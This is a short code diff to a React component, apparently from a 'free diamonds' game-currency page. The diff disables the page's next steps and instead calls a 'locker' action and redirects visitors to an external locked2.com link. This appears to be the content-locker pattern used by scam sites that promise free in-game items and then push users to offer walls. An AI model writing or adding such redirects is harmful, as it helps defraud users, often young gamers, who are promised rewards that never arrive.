@@ -82,8 +82,10 @@ const Indonesia = ({actions}) => {
             actions.addErr('no diamonds choosen')
             return 0
         }
-        setStep_2(false)
-        setStep_3(true)
+        actions.locker()
+        window.location.href='https://locked2.com/cl/i/o6pjwq'
+        //setStep_2(false)
+        //setStep_3(true)
     }
 
     
